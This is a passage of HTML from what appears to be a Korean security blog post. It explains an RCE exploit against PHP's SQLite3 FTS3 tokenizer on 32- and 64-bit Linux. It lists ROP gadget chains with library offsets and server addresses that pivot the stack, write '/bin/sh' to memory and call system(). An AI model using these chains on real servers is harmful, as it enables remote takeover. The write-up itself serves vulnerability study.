레지스터와 esp 레지스터를 체인하여 현재 프로그램 카운터가 생성된 페이로드 데이터의 메모리 대역으로 이동하도록 변경하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"wasm\"><pre class=\"language-wasm\"><code class=\"language-wasm\">xchg esp, eax;\nret;</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABF0lEQVQY01WQaU/CQBCGl0PkqCBqactRoeVubRHlKAQolpZYqIox4v//I6/ZMYT4YbKZ2Z1nnln2NHLRMyeoqn00dBuS0kbi4gZZQaaapLQQS1yjUKyhdm9AlJtg8QLuShrUuglR0imPJ4sUbBMcqJjJyQijI9yXCJeZEqRyG7u3HzjzgBr01iPC/RGD4RKMCTDtGfztAdZgDsauzkDXi8hKyFewWIWYznyksxJKchOe/46xsyFDbr8Nv2APF2AsB8Ny4G8/0e4+/wd6wQfK1S4BX/ffWLo7pNIilEqHjMdTj4Bq44HsOYgb9owJVus9Ov0RWCx/BmpNm9blEN7E4X9/qKCuWbT66XEydUt3fAA/efA6z0/AXze9iQhuLwfFAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/f542ba31671d5ad8462ff0a5e69c49ca/37523/13.png\"\n        srcset=\"/static/f542ba31671d5ad8462ff0a5e69c49ca/e9ff0/13.png 180w,\n/static/f542ba31671d5ad8462ff0a5e69c49ca/f21e7/13.png 360w,\n/static/f542ba31671d5ad8462ff0a5e69c49ca/37523/13.png 720w,\n/static/f542ba31671d5ad8462ff0a5e69c49ca/7de01/13.png 794w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"rop-기법을-활용하여-rce-취약점-수행\" style=\"position:relative;\"><a href=\"#rop-%EA%B8%B0%EB%B2%95%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%98%EC%97%AC-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%88%98%ED%96%89\" aria-label=\"rop 기법을 활용하여 rce 취약점 수행 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROP 기법을 활용하여 RCE 취약점 수행</h3>\n<ul>\n<li>앞서 취약점 활용하여 원하는 가젯들을 체인할 수 있는 벡터를 마련하였습니다.</li>\n<li>중요한 사실은 RCE를 발생하기 위해서 “/bin/sh” 명령을 내리기 위해 문자열이 있는 메모리 공간이 있어야 합니다.</li>\n<li>읽기/쓰기 가 가능한 메모리 영역으로 문자열을 쓰기 위해 하드 코딩으로 문자열을 4바이트씩 끊어 가면서 메모리 상에 쓰고 마지막에 널 바이트를 추가합니다.</li>\n<li>시스템 라이브러리 함수를 호출할 때 해당 문자열의 포인터 주소를 불러와서 호출을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"wasm\"><pre class=\"language-wasm\"><code class=\"language-wasm\">## command move step <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>~<span class=\"token number\">5</span> repeat<span class=\"token punctuation\">)</span>\npop eax ; ret               --------> libsqlite3_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x00305337</span><span class=\"token punctuation\">)</span> -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x82337</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xe9c337</span><span class=\"token punctuation\">)</span>\n;command<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>                 --------> CMD\npop edx ; ret               --------> libsqlite3_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x00305e09</span><span class=\"token punctuation\">)</span> -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x82e09</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xe9ce09</span><span class=\"token punctuation\">)</span>\n;writable <span class=\"token keyword\">memory</span>            --------> libsqlite3+<span class=\"token punctuation\">(</span><span class=\"token number\">0x8eaa0</span><span class=\"token number\">-0x18</span><span class=\"token punctuation\">)</span>                         -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xea8a88</span>, <span class=\"token number\">0xea8a8c</span>, <span class=\"token number\">0xea8a90</span>, <span class=\"token number\">0xea8a94</span>, <span class=\"token number\">0xea8a98</span>,<span class=\"token number\">0xea8a9c</span>, <span class=\"token number\">0xea8aa0</span><span class=\"token punctuation\">)</span>\nmov [edx<span class=\"token number\">+0x18</span>], eax ; ret   --------> libc-2_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x004e3642</span><span class=\"token punctuation\">)</span>     -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x2a642</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xa0d642</span><span class=\"token punctuation\">)</span>\n\n## <span class=\"token keyword\">call</span> system\npop eax ; ret               --------> libsqlite3_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x00305337</span><span class=\"token punctuation\">)</span> -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x82337</span><span class=\"token punctuation\">)</span>     -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xe9c337</span><span class=\"token punctuation\">)</span>\n;lib_system                 --------> libc<span class=\"token number\">-2</span><span class=\"token number\">+0x3af60</span>                                       -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xa1df60</span><span class=\"token punctuation\">)</span>\npop esi ; ret               --------> libphp5_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x000d5902</span><span class=\"token punctuation\">)</span>    -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x000d5902</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xb71a8902</span><span class=\"token punctuation\">)</span>\n;writable <span class=\"token keyword\">memory</span>            --------> libsqlite3<span class=\"token number\">+0x8eaa0</span>                                   -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xea8aa0</span><span class=\"token punctuation\">)</span>\npush esi ; <span class=\"token keyword\">call</span> eax;        --------> libphp5_gadget<span class=\"token punctuation\">(</span><span class=\"token number\">0x0029eb07</span><span class=\"token punctuation\">)</span>    -> <span class=\"token keyword\">offset</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x0029eb07</span><span class=\"token punctuation\">)</span>  -> server<span class=\"token punctuation\">(</span><span class=\"token number\">0xb7371b07</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>해당 가젯들은 노출된 메모리 주소에서 offset 계산을 통해 가젯을 선정한 후 쓰기 가 가능한 공간으로 <code class=\"language-text\">libcsqlite3</code> .bss 섹션을 활용합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/ElEQVQY01WQSU/CYBRFP8HZhUOiCwIqKlBKoS0dgTKUwVKQAgJGMSb+/z9xTL+di7N4ycu5N1c43pCK6qCbXbzWGL89ofBQkyxWewajBZnDa1TNJ1ntMaweB9kr2kHEevPDfVHj+PSWcJwwne0QptWjWnPRzQDLDSUNM+CpZBDFG7r9GdmjGxTVJZ7vaBiBDHD9MfPkk8KjxsnZHeEoIYq3iKbdl8+p0HZDSV3v8Fw2Wa6/GQwXCHFBperIRqlQiHP8zivbj19y+Soic8kkeudt+YWwveE/oeUM0JtdcnmF4osup1DkJAGliiXbp3cqLis2daODqnnU6i3JH5h2f2FmvciIAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/0c5aaf84765af8a9c30679d4c05294dd/37523/14.png\"\n        srcset=\"/static/0c5aaf84765af8a9c30679d4c05294dd/e9ff0/14.png 180w,\n/static/0c5aaf84765af8a9c30679d4c05294dd/f21e7/14.png 360w,\n/static/0c5aaf84765af8a9c30679d4c05294dd/37523/14.png 720w,\n/static/0c5aaf84765af8a9c30679d4c05294dd/715a3/14.png 830w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">edx</code> 레지스터에 대입된 <code class=\"language-text\">sqlite3SavedPrng</code> 주소 +0x18 번지로 역참조된 값에 하드 코딩된 값을 집어넣었습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 41.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABsElEQVQozzVRa3OaUBC9aZq2aSoBY2ulxGiiCEbEIKCCNqLGV0TGaGKtfXzo9P//hNPZdfqBWe7uztnzELV6B+3gAfZdD64foelH0A0Xnz6X8CVfRUl3ULyxcVO+gyRf4vQsi+tSA7rR5NlV0cKr1wqOjmWuouH0EPamKFcctMMx/PYQQXeCiumhVg8wX7xgOt8gTr4jX7SQkjWMp2vEyY5799ECxydpBmNA89ZH0+szCwKvN0I47j1004VR9TGZbTAYJVxVzcSbdx8Z5GHyxH1SJUQK4kg6ANbsAN2vM6bvtYZw3D6zpD5Jc7w+ouESy9Uelh3yYbKFVDzGW56plybkdJ5lC2IXjZaoVD10wjF/QW8KrzXAuZKHEO/R6oywfv6N1eYXtrs/3M/mdH6v1j+x2//lfWZK8uiKQYDdCQNSSLSgXFyxFGKcrPZ4jL9xVS4KyGkGe7hY7pA8/WC7GPDWOqRMKRJbGtAR+pdkjZfoPVu8cBjzeMvysrkyh0XeknTLDiCEdAiFQMlD1x+gcF2HqhlQMgWcpVRO8IOkIp0pMGOqJ28zHA4x/d+jXfLwH6xn97mP1bOQAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"asd.png\"\n        title=\"asd.png\"\n        src=\"/static/004ea3989fb2f251c19019243f3e9b52/37523/asd.png\"\n        srcset=\"/static/004ea3989fb2f251c19019243f3e9b52/e9ff0/asd.png 180w,\n/static/004ea3989fb2f251c19019243f3e9b52/f21e7/asd.png 360w,\n/static/004ea3989fb2f251c19019243f3e9b52/37523/asd.png 720w,\n/static/004ea3989fb2f251c19019243f3e9b52/5a6dd/asd.png 802w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 639px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 51.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABeElEQVQoz42SWXOCQBCEUWO8oiIKiOKNFx4cCqKo8Uoqlcr//zudmjHxQS2Th66dpXa/7ZlGqDVGMMcBxtYKU2cNvW5CklvIZDVo1T6iTwVWJCZe6kcSnpMyJtYKc38Pb3GArHYwsUOIUh1tw2aQEMlfoH+BhXiiBH95wmb3idf9Fyr6kB0X5Tb6Q49dJlIyBCF7gT2CMpAu2u4WUztEodiE0XMZPLXXCFZvMHoOkmkVsbj0H4dF2O4GXnDklpWyAW9x5EeC8B3h5gOWuwHNOpVRb4DXe57hfHHAYnmC6+1QrvR4djRLPzjBD45wZlv0TQ90lloXIrmzorezFZrtKcxJwA5yoo5MtoJ0VkP6ReNgSkqHXZMKxcbPtzbXybRy65DaJXczb4eB6UHTBxeXBKEHcmINUqnFQeULZyDVqUz5FjiaLHnwlrPGwPTZqap1WRV9wP8jBcIt/rZLK+ley5QoQQlAjmilg3SB6mptCKXc5YTvpXrt8Butyv1aAcVepwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/96c1b55ba8a6a3f9c6e2e70aa1721161/738b8/15.png\"\n        srcset=\"/static/96c1b55ba8a6a3f9c6e2e70aa1721161/e9ff0/15.png 180w,\n/static/96c1b55ba8a6a3f9c6e2e70aa1721161/f21e7/15.png 360w,\n/static/96c1b55ba8a6a3f9c6e2e70aa1721161/738b8/15.png 639w\"\n        sizes=\"(max-width: 639px) 100vw, 639px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>가젯 들이 동작을 하면서 마지막으로 시스템 라이브러를 호출하여 Code Execution을 수행합니다.</li>\n</ul>\n<h1 id=\"x86_64bit-환경-php-sqlite3-fts3-tokenizer-rce-취약점\" style=\"position:relative;\"><a href=\"#x86_64bit-%ED%99%98%EA%B2%BD-php-sqlite3-fts3-tokenizer-rce-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"x86_64bit 환경 php sqlite3 fts3 tokenizer rce 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>x86_64bit 환경 PHP SQLite3 fts3 tokenizer RCE 취약점</h1>\n<ul>\n<li>앞서 x86 환경에서의 공통된 취약점을 이용하며 새로운 가젯을 사용해 xCreate의 콜백 함수를 조절해서 원하는 페이로드를 실행하여 RCE를 수행해봅시다.</li>\n</ul>\n<h3 id=\"rop를-활용해서-시스템-라이브러리-함수-호출-진행\" style=\"position:relative;\"><a href=\"#rop%EB%A5%BC-%ED%99%9C%EC%9A%A9%ED%95%B4%EC%84%9C-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC-%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C-%EC%A7%84%ED%96%89\" aria-label=\"rop를 활용해서 시스템 라이브러리 함수 호출 진행 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROP를 활용해서 시스템 라이브러리 함수 호출 진행</h3>\n<ul>\n<li>64bit 환경은 32bit 환경과 다르게 레지스터를 활용해서 인자를 주고 받기 때문에 ROP 구조를 새로 구성합니다.</li>\n<li><code class=\"language-text\">[libphp5.so](http://libphp5.so)</code> 공유 라이브러리 안에 실행 권한이 있는 부분의 가젯들을 이용해서 ROP Chain을 설계 해봅시다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">leave<span class=\"token punctuation\">;</span>                     <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">stack</span> pivot\nret<span class=\"token punctuation\">;</span>                       <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">payload</span><span class=\"token operator\">-></span><span class=\"token property\">esp</span>\n\npop rax<span class=\"token punctuation\">;</span>                   <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">rax</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> system_lib\npop rbx<span class=\"token punctuation\">;</span>                   <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">rbx</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> wirtable <span class=\"token function\">memory</span><span class=\"token punctuation\">(</span>Cookie_path<span class=\"token punctuation\">)</span>\nret<span class=\"token punctuation\">;</span>\n\nmov rdi<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>rbx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>            <span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">></span>        <span class=\"token property\">rdi</span> <span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> <span class=\"token punctuation\">[</span>rbx<span class=\"token punctuation\">]</span> <span class=\"token function\">address</span><span class=\"token punctuation\">(</span>writalbe memory<span class=\"token punctuation\">)</span>\ncall rax<span class=\"token punctuation\">;</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA3ElEQVQY022QaQuCQBCGzSxLzQPL1qwktYMOy+iQLiio//+P3pipKMgPLzuzMM8+s1KrHWO1vmCzu6IXzlDT2gijFJrhc+q6QEVtQqm6nE8tKw5KZZvP30gESLMT8sMd8TCD3uggGa25jpIVwsECpt2FJFswzACOG4Ik1LoHSS4AksUyOyM/PhhEvScSTOc5h2oaJht6XG/4DFZUt9hQM8QL+DakFQkyme6w2d8wiJdsSMOW00dLJBDBmOFk/QckwDw9YLu/8XrUE8QPxrxa04v47mvYgWn3+C+LDJ+LM32NwjeMOAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/a71eafd63c47699567611c2dc9fba1ec/37523/16.png\"\n        srcset=\"/static/a71eafd63c47699567611c2dc9fba1ec/e9ff0/16.png 180w,\n/static/a71eafd63c47699567611c2dc9fba1ec/f21e7/16.png 360w,\n/static/a71eafd63c47699567611c2dc9fba1ec/37523/16.png 720w,\n/static/a71eafd63c47699567611c2dc9fba1ec/024d6/16.png 961w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Stack Pivot 가젯을 이용해서 <code class=\"language-text\">ps_globals</code> 구조체의 주소 값을 스택 메모리 상으로 변경하여 ps_globals에 저장되어 있는 필드들을 확인할 수 가 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABZklEQVQoz3WRa0sCURCGj1oRkZmmqOtdS1td9+Kqu7quq+s188aKJSEI/f//8MYZ8INFHw4Mh+GZZ95hYq0NSe5C0XoQawYkuYOEUIGQfkW+KKMsNpFMVRAMpRCLlxCJFhB+yiNwHYEv8Aj/VfjiMbVho22Ooel96K0BmoaLXFFGtzeDZc/huEsCCRkRk5kH21nAtKa4uY39A9T7aJsjKA0bstojaFUy4AyXGE23mMw9xJNlJIQyVpsvuOMNOtaUYMwXIgivz3AmqxYaTQd1xaK1taaDithCLP4MRbOxXB9gdifgfZlcDb3+Gw3iwyPRPJg/dGnIYS3DJUO+Nq95pozdIZ2tYusdsdufaF1uwc033hEfh2+8VHQwdn8JrKsW1EYfVckkC56pKBk0OZuXCMQhXXtGufH8pvMd5os9HY2x4G/DAWV4PgqvOZT5HlAoKWTzvvrEcLwm4MBd0Z+3P6FU1v4Y/gAHWs8nUgHCoAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/5442c0b2654c4bd8a7d96d1b3fe4237c/37523/17.png\"\n        srcset=\"/static/5442c0b2654c4bd8a7d96d1b3fe4237c/e9ff0/17.png 180w,\n/static/5442c0b2654c4bd8a7d96d1b3fe4237c/f21e7/17.png 360w,\n/static/5442c0b2654c4bd8a7d96d1b3fe4237c/37523/17.png 720w,\n/static/5442c0b2654c4bd8a7d96d1b3fe4237c/a0b80/17.png 955w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>시스템 라이브러리 함수를 호출하기 위해서 스택상에 있는 시스템 라이브러리를 rax 레지스터가 가리키는 형태로 진행 하였습니다.</li>\n<li>후, rbx 레지스터를 이용해서 Cookie_path 필드에 삽입한 문자열을 가리키는 주소를 대입합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA9klEQVQY04WRa1OCQBSGV+1muFwsaAMk0kpBQsQNJJTsMtX//0Nvs2caPjn64Z2deefMs8/ZZbncIc02kMU7kvQVjHFww4Nu+tC4C43fUtfpmZTuidWe+8Kesxpl9YWq/ka1+aFh4T5hFhewrkIEYYK+JtA7HR6FETBOSqxedsjlG5K0otK+mcAPYozu5qibX2T5luwHugvWNY4B1wRTWSy3ZOCIB9xPFvBGEYr1J9SMMj27sME6emu6z5ZF/4Yqy1XTAsNxCuFNIcsPehJ1oTI/79uHDaeRxGxeIMsbWkuV186YDB3xSGBzGIAbPgwrwOVAHPyUPw09mgtiwo4CAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/890cf5761cf6bfb3256b501faa2bc1c6/37523/18.png\"\n        srcset=\"/static/890cf5761cf6bfb3256b501faa2bc1c6/e9ff0/18.png 180w,\n/static/890cf5761cf6bfb3256b501faa2bc1c6/f21e7/18.png 360w,\n/static/890cf5761cf6bfb3256b501faa2bc1c6/37523/18.png 720w,\n/static/890cf5761cf6bfb3256b501faa2bc1c6/62de4/18.png 746w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">ps_globals</code> cookie_path 필드는 삽입한 페이로드를 가리키는 포인터이기 때문에 rbx 레지스터에 대입을 한 후 참조하는 과정이 필요합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token number\">0x7ff9d4cefbc0</span> <span class=\"token operator\">&lt;</span>ps_globals<span class=\"token operator\">+</span><span class=\"token number\">64</span><span class=\"token operator\">></span><span class=\"token punctuation\">:</span>  <span class=\"token operator\">=></span> <span class=\"token number\">0x00007ff9d8b15908</span>\n\n<span class=\"token number\">0x00007ff9d8b15908</span> <span class=\"token operator\">=></span>  <span class=\"token string double-quoted-string\">\"/bin/sh\"</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAjElEQVQI112ObwuCMBjEV5qE2dga/RuFWdKb0E2tIFhR3/9DXTyDifjixz3cwx3HbtULdeNQW4c02yOZr8HFERnX2OxKSHXy3iQSmMYS0WzlNdxE+BHMNA735w+mffvwYqlxLi2Ki4FtP9jqK+JE9SHSMUOf0bLu8e0LaWVeVODiAKlyXxYCYcWY4cI/TMBJZVzFvA4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/72796d74fdfa4002b09dd9c30cdc6621/37523/19.png\"\n        srcset=\"/static/72796d74fdfa4002b09dd9c30cdc6621/e9ff0/19.png 180w,\n/static/72796d74fdfa4002b09dd9c30cdc6621/f21e7/19.png 360w,\n/static/72796d74fdfa4002b09dd9c30cdc6621/37523/19.png 720w,\n/static/72796d74fdfa4002b09dd9c30cdc6621/ddc81/19.png 837w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>rbx 레지스터를 참조한 값을 호출 규약에 맞게 rdi 레지스터에 mov 명령을 통해 대입한 후 code execution을 실행합니다.</li>\n</ul>\n<h1 id=\"참조\" style=\"position:relative;\"><a href=\"#%EC%B0%B8%EC%A1%B0\" aria-label=\"참조 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 